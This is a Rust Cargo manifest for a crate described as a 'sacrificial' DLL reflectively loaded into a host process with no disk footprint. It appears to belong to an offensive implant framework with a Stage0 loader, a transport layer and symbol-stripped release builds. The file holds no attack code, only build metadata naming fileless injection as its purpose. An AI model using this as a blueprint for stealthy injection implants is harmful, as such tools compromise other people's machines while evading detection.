[package]
name = "cupcake-mod-inject"
version = "0.1.0"
edition = "2021"
description = "Sacrificial L2 inject worker DLL — reflective load into host process (zero disk)"

[lib]
name = "cupcake_mod_inject"
path = "src/lib.rs"
crate-type = ["cdylib"]

[dependencies]
# Only inject surface from core — no transport / Stage0 monolith
cupcake-core = { path = "../../core", default-features = false, features = ["inject"] }
serde_json = { version = "1.0", default-features = false, features = ["std"] }
base64 = { version = "0.21", default-features = false, features = ["std"] }

# Release profile is defined once in the workspace root (Client/Cargo.toml):
# opt-level="z", lto="fat", codegen-units=1, panic="abort", strip="symbols".
